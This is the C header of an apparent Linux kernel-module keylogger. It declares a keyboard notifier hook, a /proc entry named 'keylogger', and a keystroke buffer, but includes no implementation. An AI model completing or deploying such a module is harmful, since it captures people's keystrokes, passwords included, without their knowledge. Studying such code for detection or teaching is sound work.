#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <linux/init.h>
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>

#define PROC_FILE_NAME "keylogger"

static struct notifier_block keylogger_nb;
static struct proc_dir_entry *proc_entry;
static char keys_buffer[1024];
static int keys_buffer_pos;

static int keylogger_proc_open(struct inode *inode, struct file *file);
static ssize_t keylogger_proc_write(struct file *file, const char __user *buffer, size_t count, loff_t *offset);
static int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param);
static int __init keylogger_init(void);
static void __exit keylogger_exit(void);

#endif /* KEYLOGGER_H */
